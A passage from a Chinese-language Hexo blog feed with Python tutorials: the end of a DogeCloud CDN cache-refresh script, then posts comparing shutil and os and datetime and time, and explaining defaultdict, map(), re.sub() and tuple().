class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">select_operation</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    用户选择操作类型</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :return string: 用户选择的操作类型</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请选择操作类型：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1. 刷新 URL 操作&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2. 刷新目录操作&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;3. 预热 URL 操作&quot;</span>)</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;请输入选项（1/2/3）：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> choice <span class="keyword">in</span> [<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> choice</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无效的选择&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取用户选择的操作类型</span></span><br><span class="line">rtype_choice = select_operation()</span><br><span class="line"><span class="keyword">if</span> rtype_choice:</span><br><span class="line">    <span class="comment"># 根据操作类型构造数据</span></span><br><span class="line">    <span class="keyword">if</span> rtype_choice == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        rtype = <span class="string">&quot;url&quot;</span></span><br><span class="line">        urls_input = <span class="built_in">input</span>(<span class="string">&quot;请输入需要刷新的 URL 列表，以逗号分隔：&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> rtype_choice == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        rtype = <span class="string">&quot;path&quot;</span></span><br><span class="line">        urls_input = <span class="built_in">input</span>(<span class="string">&quot;请输入需要刷新的目录列表，以逗号分隔：&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rtype = <span class="string">&quot;prefetch&quot;</span></span><br><span class="line">        urls_input = <span class="built_in">input</span>(<span class="string">&quot;请输入需要预热的 URL 列表，以逗号分隔：&quot;</span>)</span><br><span class="line"></span><br><span class="line">    url_list = urls_input.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调用多吉云API刷新 CDN 缓存</span></span><br><span class="line">    api = dogecloud_api(</span><br><span class="line">        <span class="string">&quot;/cdn/refresh/add.json&quot;</span>, &#123;<span class="string">&quot;rtype&quot;</span>: rtype, <span class="string">&quot;urls&quot;</span>: json.dumps(url_list)&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理响应结果</span></span><br><span class="line">    <span class="keyword">if</span> api[<span class="string">&quot;code&quot;</span>] == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(api[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;task_id&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;API 失败：&quot;</span> + api[<span class="string">&quot;msg&quot;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/dogeCDN/image-20240210234408484.png"
                      alt="image-20240210234408484"
                ></p>
<p>借鉴了大佬的思路以及代码</p>
<p>致谢</p>
<blockquote>
<p><a class="link"   href="https://www.zxma.top/posts/9a06f4c1/" >https://www.zxma.top/posts/9a06f4c1/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://console.dogecloud.com/" >https://console.dogecloud.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://chat.openai.com/" >https://chat.openai.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>多吉云</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Hexo</tag>
        <tag>多吉云</tag>
        <tag>CDN</tag>
      </tags>
  </entry>
  <entry>
    <title>Python中shutil和os库的区别</title>
    <url>/posts/c846834c.html</url>
    <content><![CDATA[<p>在 Python 中，<code>shutil</code> 和 <code>os</code> 都是处理文件和目录操作的核心库，但它们的职责和适用场景有所不同。以下是它们的区别及应用场景的总结：</p>
<hr>
<h3 id="os-模块"><a href="#os-模块" class="headerlink" title="os 模块"></a><strong><code>os</code> 模块</strong></h3><p><strong>定位</strong>：提供与操作系统交互的低级接口，尤其是文件系统和进程管理。<br><strong>适用场景</strong>：</p>
<ul>
<li><strong>路径操作</strong>：<ul>
<li>使用 <code>os.path</code> 处理路径拼接（<code>join</code>）、拆分（<code>split</code>）、检查存在性（<code>exists</code>）等。<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = os.path.join(<span class="string">&quot;dir&quot;</span>, <span class="string">&quot;file.txt&quot;</span>)  <span class="comment"># 跨平台路径拼接</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><strong>文件和目录的基本操作</strong>：<ul>
<li>创建&#x2F;删除目录（<code>mkdir</code>, <code>rmdir</code>）、删除文件（<code>remove</code>）、重命名（<code>rename</code>）。</li>
<li>列出目录内容（<code>listdir</code>）、获取文件属性（<code>stat</code>）。</li>
</ul>
</li>
<li><strong>底层系统调用</strong>：<ul>
<li>修改文件权限（<code>chmod</code>）、切换工作目录（<code>chdir</code>）、执行系统命令（<code>system</code>）。</li>
</ul>
</li>
</ul>
<p><strong>局限</strong>：</p>
<ul>
<li>不直接支持高级文件操作（如复制目录树）。</li>
</ul>
<hr>
<h3 id="shutil-模块"><a href="#shutil-模块" class="headerlink" title="shutil 模块"></a><strong><code>shutil</code> 模块</strong></h3><p><strong>定位</strong>：提供高级文件操作（尤其是复制、移动和归档），是对 <code>os</code> 的补充。<br><strong>适用场景</strong>：</p>
<ul>
<li><strong>复制&#x2F;移动文件或目录</strong>：<ul>
<li>复制文件（<code>copy2</code> 保留元数据）、复制目录树（<code>copytree</code>）。</li>
<li>移动文件&#x2F;目录（<code>move</code>，跨设备时自动处理复制+删除）。<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line">shutil.copy2(<span class="string">&quot;source.txt&quot;</span>, <span class="string">&quot;dest.txt&quot;</span>)  <span class="comment"># 复制文件并保留元数据</span></span><br><span class="line">shutil.copytree(<span class="string">&quot;src_dir&quot;</span>, <span class="string">&quot;dst_dir&quot;</span>)   <span class="comment"># 递归复制目录</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><strong>归档和压缩</strong>：<ul>
<li>创建&#x2F;解压 ZIP、TAR 等归档文件（<code>make_archive</code>, <code>unpack_archive</code>）。</li>
</ul>
</li>
<li><strong>清理目录</strong>：<ul>
<li>递归删除目录及其内容（<code>rmtree</code>，比 <code>os.rmdir</code> 更强大）。</li>
</ul>
</li>
</ul>
<p><strong>局限</strong>：</p>
<ul>
<li>不处理路径操作或底层系统调用（依赖 <code>os</code> 模块）。</li>
</ul>
<hr>
<h3 id="关键区别总结"><a href="#关键区别总结" class="headerlink" title="关键区别总结"></a><strong>关键区别总结</strong></h3><table>
<thead>
<tr>
<th><strong>功能</strong></th>
<th><strong><code>os</code> 模块</strong></th>
<th><strong><code>shutil</code> 模块</strong></th>
</tr>
</thead>
<tbody><tr>
<td>路径操作</td>
<td>✅ <code>os.path</code> 子模块</td>
<td>❌ 需依赖 <code>os.path</code></td>
</tr>
<tr>
<td>创建&#x2F;删除目录</td>
<td>✅ <code>mkdir</code>, <code>rmdir</code></td>
<td>✅ <code>rmtree</code>（递归删除）</td>
</tr>
<tr>
<td>删除文件</td>
<td>✅ <code>remove</code></td>
<td>❌</td>
</tr>
<tr>
<td>复制文件</td>
<td>❌</td>
<td>✅ <code>copy</code>, <code>copy2</code></td>
</tr>
<tr>
<td>复制目录</td>
<td>❌</td>
<td>✅ <code>copytree</code></td>
</tr>
<tr>
<td>移动文件&#x2F;目录</td>
<td>✅ <code>rename</code>（有限）</td>
<td>✅ <code>move</code>（更安全）</td>
</tr>
<tr>
<td>归档压缩</td>
<td>❌</td>
<td>✅ <code>make_archive</code></td>
</tr>
<tr>
<td>系统级操作（权限&#x2F;环境）</td>
<td>✅ <code>chmod</code>, <code>environ</code></td>
<td>❌</td>
</tr>
</tbody></table>
<hr>
<h3 id="如何选择？"><a href="#如何选择？" class="headerlink" title="如何选择？"></a><strong>如何选择？</strong></h3><ul>
<li><strong>用 <code>os</code> 时</strong>：<ul>
<li>需要操作路径、处理单个文件&#x2F;目录、执行底层系统调用。</li>
</ul>
</li>
<li><strong>用 <code>shutil</code> 时</strong>：<ul>
<li>需要递归操作（如复制目录）、归档文件或简化文件移动&#x2F;复制逻辑。</li>
</ul>
</li>
</ul>
<p><strong>常见组合</strong>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例：复制目录并过滤文件</span></span><br><span class="line">src = <span class="string">&quot;project&quot;</span></span><br><span class="line">dst = <span class="string">&quot;backup_project&quot;</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(dst):</span><br><span class="line">    shutil.rmtree(dst)  <span class="comment"># 清理目标目录</span></span><br><span class="line">shutil.copytree(src, dst)</span><br></pre></td></tr></table></figure></div>

<hr>
<h3 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a><strong>5. 总结</strong></h3><ul>
<li><strong><code>os</code></strong> 是基础工具库，侧重系统和路径的低级操作。</li>
<li><strong><code>shutil</code></strong> 是高级文件操作库，简化复杂任务（如递归复制）。<br>根据任务复杂度选择合适的工具，二者常协同使用。</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python中的datatime和time库</title>
    <url>/posts/739a905d.html</url>
    <content><![CDATA[<p>在 Python 中，<code>datetime</code> 和 <code>time</code> 是两个用于处理日期和时间的常用模块，但它们的功能和用途有所不同。以下是它们的详细对比：</p>
<hr>
<h3 id="datetime-模块"><a href="#datetime-模块" class="headerlink" title="datetime 模块"></a><code>datetime</code> 模块</h3><p>用途：提供日期和时间的组合操作（年、月、日、时、分、秒等），支持算术运算（如时间差计算）。<br>常用类：</p>
<ul>
<li><code>datetime.datetime</code>：表示具体的日期和时间（如 <code>2023-10-25 14:30:00</code>）。</li>
<li><code>datetime.date</code>：仅表示日期（年、月、日）。</li>
<li><code>datetime.time</code>：仅表示时间（时、分、秒、微秒）。</li>
<li><code>datetime.timedelta</code>：表示时间间隔（用于时间加减）。</li>
</ul>
<h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, date, time, timedelta</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前时间</span></span><br><span class="line">now = datetime.now()</span><br><span class="line"><span class="built_in">print</span>(now)  <span class="comment"># 输出: 2023-10-25 14:30:00.123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建特定日期或时间</span></span><br><span class="line">d = date(<span class="number">2023</span>, <span class="number">10</span>, <span class="number">25</span>)</span><br><span class="line">t = time(<span class="number">14</span>, <span class="number">30</span>)</span><br><span class="line">dt = datetime(<span class="number">2023</span>, <span class="number">10</span>, <span class="number">25</span>, <span class="number">14</span>, <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间运算（加减）</span></span><br><span class="line">delta = timedelta(days=<span class="number">1</span>)</span><br><span class="line">tomorrow = now + delta</span><br></pre></td></tr></table></figure></div>

<hr>
<h3 id="time-模块"><a href="#time-模块" class="headerlink" title="time 模块"></a><code>time</code> 模块</h3><p>用途：主要提供与时间相关的底层函数，例如获取时间戳、休眠等，不直接处理日期。<br>常用功能：</p>
<ul>
<li><code>time.time()</code>：返回当前时间戳（秒数，从 1970 年 1 月 1 日算起）。</li>
<li><code>time.sleep(seconds)</code>：让程序暂停指定秒数。</li>
<li><code>time.localtime()</code>：将时间戳转换为本地时间的结构化格式（<code>struct_time</code>）。</li>
<li><code>time.strftime()</code>：格式化时间输出。</li>
</ul>
<h4 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前时间戳（浮点数秒数）</span></span><br><span class="line">timestamp = time.time()</span><br><span class="line"><span class="built_in">print</span>(timestamp)  <span class="comment"># 输出: 1698233400.123</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间戳转为可读格式</span></span><br><span class="line">local_time = time.localtime(timestamp)</span><br><span class="line">formatted = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, local_time)</span><br><span class="line"><span class="built_in">print</span>(formatted)  <span class="comment"># 输出: 2023-10-25 14:30:00</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 程序休眠</span></span><br><span class="line">time.sleep(<span class="number">2</span>)  <span class="comment"># 暂停2秒</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h3 id="对比总结"><a href="#对比总结" class="headerlink" title="对比总结"></a>对比总结</h3><table>
<thead>
<tr>
<th>特性</th>
<th><code>datetime</code> 模块</th>
<th><code>time</code> 模块</th>
</tr>
</thead>
<tbody><tr>
<td>主要用途</td>
<td>处理日期和时间的组合操作</td>
<td>获取时间戳、休眠、低层时间操作</td>
</tr>
<tr>
<td>日期支持</td>
<td>是（年、月、日）</td>
<td>否</td>
</tr>
<tr>
<td>时间精度</td>
<td>微秒级</td>
<td>秒级</td>
</tr>
<tr>
<td>时间运算</td>
<td>支持（如 <code>timedelta</code>）</td>
<td>不支持直接运算</td>
</tr>
<tr>
<td>格式化输出</td>
<td>通过 <code>strftime</code> 方法</td>
<td>通过 <code>time.strftime</code> 函数</td>
</tr>
<tr>
<td>典型应用场景</td>
<td>日志记录、时间差计算、日期解析</td>
<td>性能计时、程序休眠、简单时间戳操作</td>
</tr>
</tbody></table>
<hr>
<h3 id="如何选择？"><a href="#如何选择？" class="headerlink" title="如何选择？"></a>如何选择？</h3><ul>
<li><p>如果需要处理日期和时间的组合（如”2023-10-25 14:30:00”），用 <code>datetime</code>。</p>
</li>
<li><p>如果需要高精度计时或操作时间戳（如计算代码执行时间），用 <code>time</code>。</p>
</li>
<li><p>实际项目中，两者经常结合使用：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start_time = time.time()  <span class="comment"># 记录开始时间戳</span></span><br><span class="line"><span class="comment"># ...执行代码...</span></span><br><span class="line">end_time = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;耗时: <span class="subst">&#123;end_time - start_time&#125;</span>秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">current_time = datetime.now()  <span class="comment"># 获取当前完整时间</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python中的defaultdict库</title>
    <url>/posts/d3508373.html</url>
    <content><![CDATA[<p><code>defaultdict</code> 是 Python 标准库 <code>collections</code> 模块中的一个类，它是内置 <code>dict</code> 类型的子类，提供了一种在字典中处理缺失键的便捷方式。</p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><code>defaultdict</code> 与普通字典(<code>dict</code>)的主要区别在于：当你尝试访问一个不存在的键时，它会自动创建这个键并用一个默认值初始化，而不是像普通字典那样抛出 <code>KeyError</code> 异常。</p>
<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br></pre></td></tr></table></figure></div>

<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p><code>defaultdict</code> 需要一个可调用对象作为参数，这个可调用对象会在需要时提供默认值：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">dd = defaultdict(<span class="built_in">int</span>)  <span class="comment"># 默认值为0</span></span><br><span class="line">dd = defaultdict(<span class="built_in">list</span>)  <span class="comment"># 默认值为空列表[]</span></span><br><span class="line">dd = defaultdict(<span class="built_in">set</span>)   <span class="comment"># 默认值为空集合set()</span></span><br><span class="line">dd = defaultdict(<span class="built_in">str</span>)   <span class="comment"># 默认值为空字符串&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p><strong>示例 1：统计单词出现次数</strong></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">word_counts = defaultdict(<span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>]:</span><br><span class="line">    word_counts[word] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(word_counts)</span><br><span class="line"><span class="comment"># 输出: defaultdict(&lt;class &#x27;int&#x27;&gt;, &#123;&#x27;apple&#x27;: 2, &#x27;banana&#x27;: 1, &#x27;orange&#x27;: 1&#125;)</span></span><br></pre></td></tr></table></figure></div>

<p><strong>示例 2：创建字母到单词的映射</strong></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">words_by_letter = defaultdict(<span class="built_in">list</span>)</span><br><span class="line">words = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>, <span class="string">&#x27;pear&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">    first_letter = word[<span class="number">0</span>]</span><br><span class="line">    words_by_letter[first_letter].append(word)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(words_by_letter)</span><br><span class="line"><span class="comment"># 输出: defaultdict(&lt;class &#x27;list&#x27;&gt;, &#123;&#x27;a&#x27;: [&#x27;apple&#x27;], &#x27;b&#x27;: [&#x27;banana&#x27;], &#x27;o&#x27;: [&#x27;orange&#x27;], &#x27;p&#x27;: [&#x27;pear&#x27;]&#125;)</span></span><br></pre></td></tr></table></figure></div>

<h2 id="自定义默认值工厂"><a href="#自定义默认值工厂" class="headerlink" title="自定义默认值工厂"></a>自定义默认值工厂</h2><p>你可以使用任何可调用对象作为默认值工厂，包括 lambda 函数：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">dd = defaultdict(<span class="keyword">lambda</span>: <span class="string">&#x27;unknown&#x27;</span>)</span><br><span class="line">dd[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;Alice&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(dd[<span class="string">&#x27;name&#x27;</span>])  <span class="comment"># 输出: Alice</span></span><br><span class="line"><span class="built_in">print</span>(dd[<span class="string">&#x27;age&#x27;</span>])   <span class="comment"># 输出: unknown</span></span><br></pre></td></tr></table></figure></div>

<h2 id="与普通字典的区别"><a href="#与普通字典的区别" class="headerlink" title="与普通字典的区别"></a>与普通字典的区别</h2><ol>
<li><p><strong>处理缺失键</strong>：</p>
<ul>
<li><code>dict</code>：访问不存在的键会引发 <code>KeyError</code></li>
<li><code>defaultdict</code>：自动创建键并赋予默认值</li>
</ul>
</li>
<li><p><strong>初始化</strong>：</p>
<ul>
<li><code>dict</code>：不需要初始化函数</li>
<li><code>defaultdict</code>：必须提供默认值工厂函数</li>
</ul>
</li>
</ol>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
<li>使用 <code>defaultdict</code> 时，<code>KeyError</code> 异常会被静默处理，这有时可能掩盖程序中的逻辑问题</li>
<li>当需要检查键是否存在时，<code>defaultdict</code> 的行为可能与预期不同</li>
<li>序列化时，<code>defaultdict</code> 的默认工厂函数不会被保存</li>
</ol>
<h2 id="实际应用场景"><a href="#实际应用场景" class="headerlink" title="实际应用场景"></a>实际应用场景</h2><ol>
<li>计数和聚合操作</li>
<li>构建多值字典（一个键对应多个值）</li>
<li>图算法中的邻接表表示</li>
<li>需要避免频繁检查键是否存在的场景</li>
</ol>
<p><code>defaultdict</code> 是 Python 中一个非常有用的工具，可以简化许多涉及字典的常见编程模式，使代码更加简洁和高效。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python中的map函数</title>
    <url>/posts/6bbcb18e.html</url>
    <content><![CDATA[<h1 id="Python中的map函数"><a href="#Python中的map函数" class="headerlink" title="Python中的map函数"></a>Python中的map函数</h1><p><code>map()</code> 函数是Python中的一个内置函数，用于对可迭代对象（比如列表、元组等）中的每个元素应用一个指定的函数，然后返回一个包含所有函数返回值的迭代器。它的一般语法是：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map</span>(function, iterable, ...)</span><br></pre></td></tr></table></figure></div>

<p>其中：</p>
<ul>
<li><code>function</code> 是一个函数，用于对 <code>iterable</code> 中的每个元素进行操作。它可以是内置的函数，也可以是自定义的函数。</li>
<li><code>iterable</code> 是一个或多个可迭代对象，例如列表、元组等。如果提供了多个可迭代对象，<code>map()</code> 函数会以并行的方式对它们进行操作，即将每个可迭代对象中对应位置的元素作为参数传递给 <code>function</code>。</li>
<li><code>map()</code> 函数会返回一个迭代器，其中包含了 <code>function</code> 对 <code>iterable</code> 中每个元素执行操作后的结果。</li>
</ul>
<p>下面是一个简单的例子，演示了如何使用 <code>map()</code> 函数计算列表中每个数字的平方：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，用于计算平方</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 map() 函数计算平方</span></span><br><span class="line">squared_numbers = <span class="built_in">map</span>(square, numbers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将迭代器转换为列表并打印结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(squared_numbers))  <span class="comment"># 输出: [1, 4, 9, 16, 25]</span></span><br></pre></td></tr></table></figure></div>

<p>在这个例子中，<code>map(square, numbers)</code> 将 <code>numbers</code> 列表中的每个元素都传递给 <code>square()</code> 函数进行计算，最终返回一个迭代器，其中包含了每个元素的平方值。</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>语法</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python中的re.sub() 函数详解</title>
    <url>/posts/fe4ab0b.html</url>
    <content><![CDATA[<p><code>re.sub()</code> 函数是 Python 的 <code>re</code> 模块中用于替换字符串的函数。它功能强大，可以实现各种复杂的文本处理需求。</p>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">re.sub(pattern, repl, string, count = <span class="number">0</span>, flags = <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><ul>
<li><code>pattern</code>: 需要被替换的正则表达式模式。</li>
<li><code>repl</code>: 替换字符串或一个函数。</li>
<li><code>string</code>: 需要进行替换操作的原始字符串。</li>
<li><code>count</code> (可选): 指定最大替换次数，默认为 0，表示替换所有匹配。</li>
<li><code>flags</code> (可选): 用于控制正则表达式的匹配方式，例如是否忽略大小写等。</li>
</ul>
<h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>替换后的新字符串。</p>
<h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><h3 id="1-使用字符串进行替换"><a href="#1-使用字符串进行替换" class="headerlink" title="1. 使用字符串进行替换"></a>1. 使用字符串进行替换</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;The price is 123 dollars and 45 cents.&quot;</span></span><br><span class="line">new_text = re.sub(<span class="string">r&#x27;\d+&#x27;</span>, <span class="string">&#x27;NUM&#x27;</span>, text)</span><br><span class="line"><span class="built_in">print</span>(new_text)  <span class="comment"># 输出: The price is NUM dollars and NUM cents.</span></span><br></pre></td></tr></table></figure></div>

<h3 id="2-使用函数进行替换"><a href="#2-使用函数进行替换" class="headerlink" title="2. 使用函数进行替换"></a>2. 使用函数进行替换</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;this is a test sentence.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">capitalize</span>(<span class="params"><span class="keyword">match</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">0</span>).capitalize()</span><br><span class="line"></span><br><span class="line">new_text = re.sub(<span class="string">r&#x27;\b\w+\b&#x27;</span>, capitalize, text)</span><br><span class="line"><span class="built_in">print</span>(new_text)  <span class="comment"># 输出: This Is A Test Sentence.</span></span><br></pre></td></tr></table></figure></div>

<h3 id="3-使用捕获组进行替换"><a href="#3-使用捕获组进行替换" class="headerlink" title="3. 使用捕获组进行替换"></a>3. 使用捕获组进行替换</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;Contact me at 123-456-7890 or 987-654-3210.&quot;</span></span><br><span class="line">formatted_text = re.sub(<span class="string">r&#x27;(\d&#123;3&#125;)-(\d&#123;3&#125;)-(\d&#123;4&#125;)&#x27;</span>, <span class="string">r&#x27;(\1) \2-\3&#x27;</span>, text)</span><br><span class="line"><span class="built_in">print</span>(formatted_text)  <span class="comment"># 输出: Contact me at (123) 456-7890 or (987) 654-3210.</span></span><br></pre></td></tr></table></figure></div>

<h3 id="4-结合-flags-使用"><a href="#4-结合-flags-使用" class="headerlink" title="4. 结合 flags 使用"></a>4. 结合 flags 使用</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;Baked Beans And Spam&quot;</span></span><br><span class="line">new_text = re.sub(<span class="string">r&#x27;\sAND\s&#x27;</span>, <span class="string">&#x27; &amp; &#x27;</span>, text, flags = re.IGNORECASE)</span><br><span class="line"><span class="built_in">print</span>(new_text)</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>Python中的tuple函数</title>
    <url>/posts/249dac9b.html</url>
    <content><![CDATA[<h1 id="Python中的tuple函数"><a href="#Python中的tuple函数" class="headerlink" title="Python中的tuple函数"></a>Python中的tuple函数</h1><p>在Python中，<code>tuple()</code> 函数是一个内置函数，用于将序列或可迭代对象转换为元组。它的语法是：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tuple</span>(iterable)</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>iterable</code> 可以是一个序列（如列表或字符串）或者任何可迭代对象（如另一个元组）。<code>tuple()</code> 函数会将提供的可迭代对象中的元素按照其顺序转换为一个新的元组。</p>
<p>以下是一些示例说明 <code>tuple()</code> 函数的使用：</p>
